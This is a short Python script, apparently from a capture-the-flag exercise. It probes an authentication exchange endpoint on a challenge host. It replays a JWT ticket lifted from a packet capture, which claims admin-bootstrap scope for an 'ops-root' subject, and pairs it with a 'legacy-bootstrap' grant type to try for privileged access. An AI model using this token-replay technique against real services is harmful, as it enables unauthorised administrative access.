import requests

base = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

# Test POST /api/auth/exchange with various payloads
r1 = requests.post(f"{base}/api/auth/exchange", json={})
print("POST /api/auth/exchange ({}) ->", r1.status_code, r1.text)

ticket_pcap = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImxlZ2FjeS1yczI1Ni1yZXRpcmVkIn0.eyJ0eXAiOiJ0aWNrZXQiLCJzY29wZSI6ImFkbWluLWJvb3RzdHJhcCIsInN1YiI6Im9wcy1yb290IiwiaXNzIjoiZ2hvc3QtcGFja2V0LWF1dGgiLCJhdWQiOiJnaG9zdC1wYWNrZXQtdGlja2V0IiwiaXF0IjoxNzE4MTE5MDI0LCJleHAiOjE3MTgxMTkyMDR9.ZXhwaXJlZC10ZXN0LWNhcHR1cmUtc2lnbmF0dXJl"

r2 = requests.post(f"{base}/api/auth/exchange", json={"ticket": ticket_pcap, "grantType": "legacy-bootstrap"})
print("POST /api/auth/exchange (pcap ticket) ->", r2.status_code, r2.text)
